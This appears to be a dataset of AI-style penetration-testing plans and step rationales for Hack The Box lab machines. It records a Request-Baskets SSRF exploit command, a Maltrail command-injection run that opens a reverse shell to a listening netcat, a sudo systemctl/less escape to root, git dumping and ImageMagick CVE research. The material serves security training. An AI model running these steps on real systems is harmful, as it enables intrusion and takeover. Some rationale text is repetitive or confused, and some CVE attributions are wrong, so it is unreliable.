2. The key finding from this step is that the puma user can run the command `/usr/bin/systemctl status trail.service` without a password. This command can provide valuable information about the ""trail.service"", which might be a potential vector for privilege escalation. If the service is misconfigured or running with higher privileges, it might be possible to exploit it to gain root access.

3. Given this, the next logical step in the penetration testing process is to run the command `/usr/bin/systemctl status trail.service` and see what happens. This step aligns with the overall strategy to enumerate and find more information to escalate the privilege. By running this command, we can potentially identify insecure configurations, weak permissions, or other vulnerabilities that can be exploited for privilege escalation.

4. Therefore, the strategy to run the command `/usr/bin/systemctl status trail.service` is a logical next step. This strategy follows logically from the findings of the previous steps and aligns with the overall goal of the penetration testing process, which is to gain as much control over the system as possible in",Exploit the selected exploitation,"1. The previous step in the penetration testing process was successful in exploring suspicious files, commands, and their privileges. The key finding from this step is that the user ""puma"" has sudo privileges to run the command `/usr/bin/systemctl status trail.service` without a password. This command could potentially provide valuable information about the ""trail.service"", which could be a potential vector for privilege escalation.

2. Given this, the selected step to exploit the selected exploitation is a logical continuation of the process. This step aligns with the overall strategy to run the command `/usr/bin/systemctl status trail.service` and see what happens. By exploiting this command, we could potentially identify insecure configurations, weak permissions, or other vulnerabilities that can be exploited for privilege escalation.

3. Furthermore, exploiting the selected exploitation is a critical part of this step. This exploitation could provide a comprehensive overview of the potential attack vectors available for privilege escalation. It could also help in planning the next steps of the penetration testing process, by identifying the most promising avenues for further exploration or exploitation.

4. Therefore, the selected step to exploit the selected exploitation follows logically from the findings of the previous steps and aligns with the overall goal of the penetration testing process. This step moves us closer to the goal of gaining higher","{'Metasploit': ""Run the command '/usr/bin/systemctl status trail.service' to check for vulnerabilities.""}"
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed)
       1.3.1:{Nmap version:7.80, Scan date and time:2024-01-04 10:26 EST, IP address scanned:10.10.11.224, Host status:Up, Latency:0.11s, Closed ports:65531, Scan duration:7.31 seconds}
       1.3.2 Determine the services and versions on each open port - (completed)
       1.3.2:{Open Ports and Services: Port 22/tcp: Open, Service: ssh, Port 55555/tcp: Open, Service: unknown, Filtered Ports and Services: Port 80/tcp: Filtered, Service: http, Port 8338/tcp: Filtered, Service: unknown} 
       1.3:{Target IP:10.129.229.26}
       1.3.3 Enumerate port 80 - (completed)
       1.3.3:{Port 80: Not loaded}
       1.3.4 Enumerate port 55555 - (completed)
       1.3.4:{Port 55555: Directs to a web page, Web page function: Collecting and inspecting HTTP requests, Web page URL: http://10.129.229.26:55555/, Action: Creating a basket to collect and inspect HTTP requests, Result of action: Returns a token for future basket access, Basket created: 'wygbo5a', Token received: fAyZqu93BRdiZ2UakGim_JbTk5rhtCrmUojTozkLjoNM}
       1.3.5 Further Enumerate the website - (completed)
       1.3.5:{Basket functionality: Collects HTTP requests, Basket status: Empty, Basket URL: http://10.129.229.26:55555/wygbo5a, GET request made to the basket, GET request time: 8:08:58 pm 02/08/2025, GET request endpoint: /wygbo5a, Headers of GET request: Accept: */*, User-Agent: curl/8.5.0, Powering service: request-baskets, Version: 1.2.1, Directories found with statuses, sizes: /baskets: Status 401, Size 0, /Documents and Settings: Status 400, Size 75, /lost+found: Status 400, Size 75, /Program Files: Status 400, Size 75, /reports list: Status 400, Size 75, /web: Status 200, Size 8700}
   1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1 - (completed)
   1.4:{Vulnerability identified: CVE-2023-27163, Vulnerability type: Server-Side Request Forgery (SSRF), Vulnerability severity: Critical, Vulnerable component: `/api/baskets/{name}` in Request-Baskets version 1.2.1, Vulnerability description: Allows attackers to make unauthorized requests to internal or external resources. It can lead to access to network resources, sensitive information, and exploitation of other vulnerabilities, Exploitation method: Involves creating a basket within Request-Baskets and manipulating the `forward_url` parameter to point to internal services or resources, Impact: Information Disclosure/Exfiltration: Retrieval of sensitive data from internal network resources, Unauthorized Access: Potential bypass of security measures to access resources, Further Attacks: SSRF vulnerability can be chained with other exploits for more severe outcomes, like Remote Code Execution (RCE), Service Disruption: Potential overload of the server leading to denial-of-service conditions, Mitigation: Update Request-Baskets to a version higher than 1.2.1, implement strong network security practices, and robust authentication mechanisms}
   1.5 Exploit the found exploitation - (completed)
   1.5:{Command executed: `sudo ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80`, Purpose: Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163), More info URL: https://github.com/entr0pie/CVE-2023-27163, Action: Created a proxy basket ""qrylhr"", Result: Accessing http://10.129.229.26:55555/qrylhr makes the server request to http://127.0.0.1:80, Authorization token: QpN9Y1vLdotSZOPzt7P00SUDMvZngpKrBhJqlfdRJPOJ, Findings: Port 80 is powered by Maltrail (v0.53), Maltrail interface includes: Documentation, Wiki, Issues, Log In, Threats, Events, Severity, Sources, Trails, Maltrail version: v0.53}
   1.6 Perform vulnerability analysis on Maltrail (v0.53) - (completed)
   1.6:{Maltrail version: 0.53, Vulnerabilities identified: Unauthenticated Remote Code Execution (RCE) and Command Injection, Specific vulnerabilities: CVE-2023-27163: Allows for unauthenticated RCE. The exploit involves sending a crafted payload to the login endpoint of Maltrail, enabling arbitrary code execution on the target system without credentials. This could lead to gaining a shell on the victim machine, Unauthenticated Command Injection: Present in versions prior to 0.54, including 0.53. The vulnerability exists in the `params.get(""username"")` parameter within the `mailtrail/core/http.py` file. Attackers can inject arbitrary OS commands through the username parameter, which will be executed with the privileges of the running process. This has been successfully tested on Maltrail versions 0.52 and 0.53, Exploitation: Involves sending a specially crafted request to the Maltrail login endpoint to execute malicious commands or establish a reverse shell, Mitigation recommendation: Update Maltrail to a patched version as soon as possible to mitigate these risks.}
   1.7 Exploit the selected exploitation - (completed)
   1.7:{Action: Modified the Proof-of-Concept (POC) for CVE-2023-27163 by removing /login on line 28, Command executed: `./cve-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80/login`, Result: Created a proxy basket ""jgulua"". Accessing http://10.10.11.224:55555/jgulua now makes the server request to http://127.0.0.1:80/login, Authorization token: Je6HFdfIxVWIxmlDzyQWsTnB0uFGpdBAkOb8n3WniMGZ, Action: Ran the modified exploit script using command `python maltrail_rce. 10.10.16.163 443 http://10.129.229.26:55555/jgulua`, Observation: The script hangs, but a shell is received on a listening netcat (nc) at port 443, Shell details: Connection received on 10.10.11.224 46168, uid=1001(puma), gid=1001(puma), groups=1001(puma)}
   1.8 Explore the suspicious files, commands and create a summary of the findings - (completed)
   1.8:{User examined: puma, Server: sau, sudo privileges: puma user can run some systemctl commands as root without a password, Specific command puma can run without password: `/usr/bin/systemctl status trail.service`, Matching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin}
   1.9 Exploit the selected exploitation - (completed)
   1.9:{Command executed: `sudo /usr/bin/systemctl status trail.service` by user puma on server",Run the command /usr/bin/systemctl status trail.service,"1. The previous step in the penetration testing process was successful in exploring suspicious files, commands, and their privileges. The key finding from this step is that the user ""puma"" has sudo privileges to run the command `/usr/bin/systemctl status trail.service` without a password. This command could potentially provide valuable information about the ""trail.service"", which could be a potential vector for privilege escalation.

2. Given this, the selected step to exploit the selected exploitation is a logical continuation of the process. This step aligns with the overall strategy to run the command `/usr/bin/systemctl status trail.service` and see what happens. By exploiting this command, we could potentially identify insecure configurations, weak permissions, or other vulnerabilities that can be exploited for privilege escalation.

3. Furthermore, exploiting the selected exploitation is a critical part of this step. This exploitation could provide a comprehensive overview of the potential attack vectors available for privilege escalation. It could also help in planning the next steps of the penetration testing process, by identifying the most promising avenues for further exploration or exploitation.

4. Therefore, the selected step to exploit the selected exploitation follows logically from the findings of the previous steps and aligns with the overall goal of the penetration testing process. This step moves us closer to the goal of gaining higher","- Command executed: `sudo /usr/bin/systemctl status trail.service` by user puma on server sau.
- Service examined: trail.service - Maltrail, a server of malicious traffic detection system.
- Service status: Active and running.
- Main PID: 891 (python3)
- Memory used: 26.7M
- Documentation for the service: https://github.com/stamparm/maltrail#readme and https://github.com/stamparm/maltrail/wiki
- Observation: The terminal hangs at the bottom.
- Action: Entering `!sh` in less runs sh and drops to a shell.
- Result: Gained root shell access.",End the pentesting task,"1. The intended task of the previous step was to exploit the selected exploitation, which was successfully achieved. The exploitation resulted in gaining root shell access on the target system, which is the highest level of access and control over the system.

2. The key finding from this step is that we were able to exploit the command `/usr/bin/systemctl status trail.service` that the ""puma"" user could run without a password to gain root access. This is a significant achievement in a penetration testing process as it means we have full control over the system. This could potentially allow us to access all data and functionality of the system, essentially bypassing all security measures.

3. Given this, the next logical step in the penetration testing process is to end the task. This is because the ultimate goal of the penetration testing process - gaining as much control over the system as possible - has been achieved. Continuing with the same strategy or moving to a new strategy would not provide any additional benefits at this point.

4. Therefore, the strategy to end the penetration testing task is a logical next step. This strategy follows logically from the findings of the previous steps and aligns with the overall goal of the penetration testing process. This step signifies the successful completion of the penetration testing process, with the achievement of the ultimate goal of gaining root access on the target system.",End task and ask permission to generate the report,"1. The previous step in the penetration testing process was successful in exploiting the selected exploitation. The key finding from this step is that we were able to gain root shell access on the target system. This is a significant achievement as it means we have full control over the system.

2. Given this, the selected step to end the task and ask for permission to generate the report is a logical continuation of the process. This step aligns with the overall strategy to end the task once the end goal is achieved. By ending the task, we are effectively concluding the active part of the penetration testing process.

3. Furthermore, asking for permission to generate the report is a critical part of this step. This is because the report will contain detailed information about the vulnerabilities discovered, the exploits used, and the level of access gained. It is important to get permission from the user before generating such a report due to the sensitive nature of the information it will contain.

4. Therefore, the selected step to end the task and ask for permission to generate the report follows logically from the findings of the previous steps and aligns with the overall goal of the penetration testing process. This step moves us closer to the goal of providing the user with a comprehensive report on the security status of their system.",{'Nmap': 'Scan ports and services'}
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}",,,"- IP Address: 10.129.237.31
- Host Status: Up
- Latency: 0.95s
- Closed TCP Ports: 998
- Open Ports:
  - Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
    - SSH-Hostkey: 
      - RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3
      - ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af
      - ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04
  - Port 80: Open, Service: HTTP, Version: nginx 1.18.0
- HTTP Title: Did not follow redirect to http://pilgrimage.htb/
- HTTP Server Header: nginx/1.18.0
- Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
- Scan Duration: 116.19 seconds","Enumerate the port 80, the HTTP service","1. The intended task of the previous step was to identify open ports and determine the services and their versions running on these ports. This task was successfully achieved. We found that ports 22 and 80 are open on the target machine.

2. The key findings from the previous step are that port 22 is running SSH service with OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) and port 80 is running HTTP service with nginx 1.18.0. This information is crucial as it provides insight into potential vulnerabilities that can be exploited. For instance, certain versions of services may have known vulnerabilities that can be exploited.

3. Given these findings, it is reasonable to move forward with the same strategy of enumerating the services. Since port 80 is running HTTP service, it is advisable to start with this port as it often hosts web applications which can have a multitude of potential vulnerabilities. Therefore, the next step would be to enumerate the HTTP service on port 80. This can provide more detailed information about the target system and potentially reveal additional attack vectors.","Enumerate further on the X service to find software versions, hidden directories and file.","1. The previous step successfully identified that port 80 is open and running an HTTP service with nginx 1.18.0. This is a significant finding as HTTP services often host web applications, which can be a rich source of potential vulnerabilities.

2. The HTTP service was identified as running nginx 1.18.0. This information can be used to research known vulnerabilities of this specific version of nginx. Furthermore, HTTP services often contain hidden directories and files which may not be immediately visible to users. These hidden resources can sometimes contain sensitive information or functionality that can be exploited.

3. Given this, the logical next step is to enumerate the HTTP service further to identify software versions, hidden directories, and files. This can be achieved using tools like a web browser for manual exploration, curl for making direct HTTP requests, and gobuster for automated directory and file enumeration. This detailed enumeration can provide additional information about the target system and potentially reveal more attack vectors. This aligns with the overall strategy of thorough enumeration of identified services.","{'Web page interaction': 'Manually explore the HTTP service for hidden directories and files.', 'Dirbuster': 'Automate directory and file enumeration on the HTTP service.'}"
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}","Enumerate the port 80, the HTTP service","1. The previous step successfully identified that port 80 is open and running an HTTP service with nginx 1.18.0. This is a significant finding as HTTP services often host web applications, which can be a rich source of potential vulnerabilities.

2. The HTTP service was identified as running nginx 1.18.0. This information can be used to research known vulnerabilities of this specific version of nginx. Furthermore, HTTP services often contain hidden directories and files which may not be immediately visible to users. These hidden resources can sometimes contain sensitive information or functionality that can be exploited.

3. Given this, the logical next step is to enumerate the HTTP service further to identify software versions, hidden directories, and files. This can be achieved using tools like a web browser for manual exploration, curl for making direct HTTP requests, and gobuster for automated directory and file enumeration. This detailed enumeration can provide additional information about the target system and potentially reveal more attack vectors. This aligns with the overall strategy of thorough enumeration of identified services.","- Webpage contains an image shrinker feature
- Feroxbuster tool used for directory and file enumeration
  - Target URL: http://pilgrimage.htb
  - Threads: 50
  - Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt
  - Status Codes: All
  - Timeout: 7 seconds
  - User-Agent: feroxbuster/2.10.0
  - Extract Links: True
  - HTTP methods: GET
  - Recursion Depth: 4
- Scan Results:
  - Found 46 paths with 0 errors
  - Significant paths found:
    - http://pilgrimage.htb/.git/
    - http://pilgrimage.htb/.git/logs/
    - http://pilgrimage.htb/assets/
    - http://pilgrimage.htb/assets/css/
    - http://pilgrimage.htb/assets/images/
    - http://pilgrimage.htb/assets/js/
    - http://pilgrimage.htb/tmp/
    - http://pilgrimage.htb/vendor/
    - http://pilgrimage.htb/vendor/jquery/",dumb the git repository and check its content,"1. The intended task of the previous step was to enumerate the HTTP service on port 80. This task was successfully achieved. The enumeration revealed several directories and files hosted on the website, including a git repository.

2. The key findings from the previous step are the various paths found, specifically the presence of a git repository at http://pilgrimage.htb/.git/. This is a significant finding as git repositories can often contain sensitive information such as source code, configuration files, and possibly credentials. Therefore, it may provide valuable insights into the system's architecture and potential vulnerabilities.

3. Given these findings, it is reasonable to move forward with the same strategy of enumeration, specifically focusing on the git repository. The next logical step would be to dump the git repository and examine its contents. This could potentially reveal sensitive information that could be used to exploit the system further. This aligns with the overall strategy of thorough enumeration and analysis of the identified services and resources.","Further Enumerate the website. - hidden directories, links and software","1. The previous step successfully identified a git repository hosted on the website at the path http://pilgrimage.htb/.git/. This is a significant finding as git repositories often contain valuable information about the system's architecture, source code, configuration files, and sometimes even sensitive data like credentials.

2. Git repositories are used for version control and can provide a history of all changes made to the files they contain. This means that even if sensitive information was removed from the current version of the files, it might still exist in the history of the repository. Therefore, dumping the git repository and examining its content could potentially reveal sensitive information or clues about potential vulnerabilities.

3. Given this, the logical next step is to further enumerate the website by dumping the git repository and checking its contents. This step is a continuation of the overall strategy of thorough enumeration and analysis of the identified services and resources. By doing so, we might uncover additional attack vectors or valuable information that could aid in the exploitation of the system.",{'Web page interaction': 'Dump the git repository from http://pilgrimage.htb/.git/ and examine its contents for sensitive information.'}
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration}",dumb the git repository and check its content,"1. The previous step successfully identified a git repository hosted on the website at the path http://pilgrimage.htb/.git/. This is a significant finding as git repositories often contain valuable information about the system's architecture, source code, configuration files, and sometimes even sensitive data like credentials.

2. Git repositories are used for version control and can provide a history of all changes made to the files they contain. This means that even if sensitive information was removed from the current version of the files, it might still exist in the history of the repository. Therefore, dumping the git repository and examining its content could potentially reveal sensitive information or clues about potential vulnerabilities.

3. Given this, the logical next step is to further enumerate the website by dumping the git repository and checking its contents. This step is a continuation of the overall strategy of thorough enumeration and analysis of the identified services and resources. By doing so, we might uncover additional attack vectors or valuable information that could aid in the exploitation of the system.","- Git-dumper tool used to clone Git repository
  - Target URL: http://pilgrimage.htb/
  - Output Directory: ./pilgrimage_source
- Test Results:
  - http://pilgrimage.htb/.git/HEAD [200]
  - http://pilgrimage.htb/.git/ [403]
- Fetching Common Files:
  - http://pilgrimage.htb/.gitignore [404]
- Git Objects Fetched:
  - http://pilgrimage.htb/.git/objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987 [200]
  - http://pilgrimage.htb/.git/objects/23/1150acdd0lbbbef94dfb9da9f79476bfbb16fc [200]
  - http://pilgrimage.htb/.git/objects/ca/d9dfca08306027b234ddc2166c838de9301487 [200]
  - http://pilgrimage.htb/.git/objects/88/16d69710c5d2ee58db84afa5691495878f4ee1 [200]
  - http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
- Full clone of the Git repository has been obtained and is ready for further enumeration.",Check the content in the git repository.,"1. The intended task of the previous step was to dump the git repository found on the website. This task was successfully achieved. The Git-dumper tool was used to clone the Git repository and a full clone of the Git repository has been obtained.

2. The key finding from the previous step is the successful cloning of the Git repository. This is significant as Git repositories often contain valuable information such as source code, configuration files, and possibly credentials. Therefore, it may provide valuable insights into the system's architecture and potential vulnerabilities.

3. Given these findings, it is reasonable to continue with the same strategy of enumeration, specifically focusing on the Git repository. The next logical step would be to examine the contents of the Git repository. This could potentially reveal sensitive information, such as credentials, or clues about potential vulnerabilities that could be used to exploit the system further. This aligns with the overall strategy of thorough enumeration and analysis of the identified services and resources.","Explore the suspicious files, commands and create a summary of the findings.","1. The previous step successfully cloned the git repository hosted on the website. This is a significant finding as git repositories often contain valuable information about the system's architecture, source code, configuration files, and sometimes even sensitive data like credentials.

2. Git repositories are used for version control and can provide a history of all changes made to the files they contain. This means that even if sensitive information was removed from the current version of the files, it might still exist in the history of the repository. Therefore, exploring the contents of the git repository could potentially reveal sensitive information or clues about potential vulnerabilities.

3. Given this, the logical next step is to explore the suspicious files, commands in the git repository and create a summary of the findings. This step is a continuation of the overall strategy of thorough enumeration and analysis of the identified services and resources. By doing so, we might uncover additional attack vectors or valuable information that could aid in the exploitation of the system.","{'Interactive CLI': 'Explore the contents of the cloned git repository and analyze files and commands.', 'Google search': 'Research any suspicious files or commands found for known vulnerabilities.'}"
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [to-do]",Check the content in the git repository.,"1. The previous step successfully cloned the git repository hosted on the website. This is a significant finding as git repositories often contain valuable information about the system's architecture, source code, configuration files, and sometimes even sensitive data like credentials.

2. Git repositories are used for version control and can provide a history of all changes made to the files they contain. This means that even if sensitive information was removed from the current version of the files, it might still exist in the history of the repository. Therefore, exploring the contents of the git repository could potentially reveal sensitive information or clues about potential vulnerabilities.

3. Given this, the logical next step is to explore the suspicious files, commands in the git repository and create a summary of the findings. This step is a continuation of the overall strategy of thorough enumeration and analysis of the identified services and resources. By doing so, we might uncover additional attack vectors or valuable information that could aid in the exploitation of the system.","- The repository contains the source code of the web application, primarily consisting of PHP files and assets.
- A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images.
- Next step is to check the version of the 'magick' tool.",Do a vulnerability analysis on the imagemagick 7.1.0-49,"1. The intended task of the previous step was to explore the contents of the dumped Git repository, specifically looking for any suspicious files or commands. This task was successfully achieved. The key finding was the presence of a binary named 'magick' which is part of the ImageMagick software suite used for editing and manipulating digital images.

2. The discovery of the 'magick' binary is significant as it could potentially be a point of vulnerability. ImageMagick has been known to have vulnerabilities in the past, and if the version used in the web application is outdated or unpatched, it could be exploited. It's also worth noting that the web application features an image shrinker, which could be utilizing this 'magick' binary, further increasing its relevance.

3. Given these findings, it is reasonable to continue with the same strategy of enumeration and vulnerability analysis. The next logical step would be to perform a vulnerability analysis on the discovered ImageMagick version (7.1.0-49). This could potentially uncover known vulnerabilities that could be exploited to gain further access to the system or escalate privileges. This aligns with the overall strategy of thorough enumeration and analysis of the identified services and resources.",Do a google search for more information,"1. The previous step identified the presence of a binary named 'magick' which is part of the ImageMagick software suite used for editing and manipulating digital images. The version of ImageMagick being used is 7.1.0-49. This is a significant finding as software components often have known vulnerabilities that could potentially be exploited.

2. ImageMagick has been known to have vulnerabilities in the past, and the specific version identified (7.1.0-49) could potentially have unpatched vulnerabilities. If such vulnerabilities exist and can be exploited, it could provide an attacker with further access to the system or even allow for privilege escalation.

3. Given this, the logical next step is to perform a vulnerability analysis on the identified ImageMagick version. One of the most straightforward ways to do this is by conducting a Google search. This can provide information about known vulnerabilities associated with the specific version of ImageMagick, as well as potential exploits that could be used. This step aligns with the overall strategy of thorough enumeration and analysis of identified services and resources, with the aim of identifying potential attack vectors.",{'Google search': 'Search for known vulnerabilities and exploits for ImageMagick version 7.1.0-49'}
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [completed] {ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images, Public exploits are available, Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities}
   1.7 Plan for Exploitation - [to-do] {Based on the known vulnerabilities and available exploits}",Do a vulnerability analysis on the imagemagick 7.1.0-49,"1. The previous step identified the presence of a binary named 'magick' which is part of the ImageMagick software suite used for editing and manipulating digital images. The version of ImageMagick being used is 7.1.0-49. This is a significant finding as software components often have known vulnerabilities that could potentially be exploited.

2. ImageMagick has been known to have vulnerabilities in the past, and the specific version identified (7.1.0-49) could potentially have unpatched vulnerabilities. If such vulnerabilities exist and can be exploited, it could provide an attacker with further access to the system or even allow for privilege escalation.

3. Given this, the logical next step is to perform a vulnerability analysis on the identified ImageMagick version. One of the most straightforward ways to do this is by conducting a Google search. This can provide information about known vulnerabilities associated with the specific version of ImageMagick, as well as potential exploits that could be used. This step aligns with the overall strategy of thorough enumeration and analysis of identified services and resources, with the aim of identifying potential attack vectors.","- ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images.

- CVE-2022-44268: Information Disclosure / Arbitrary File Read
  - Description: Allows for information disclosure when parsing a PNG image, potentially embedding content of an arbitrary file.
  - Impact: Unauthorized disclosure of sensitive information from the system where ImageMagick is running. High confidentiality impact.
  - Technical Details: Network attack vector, low attack complexity, no privileges required, user interaction required.
  - CVSS v3 Base Metrics: High Confidentiality, None Integrity, None Availability.
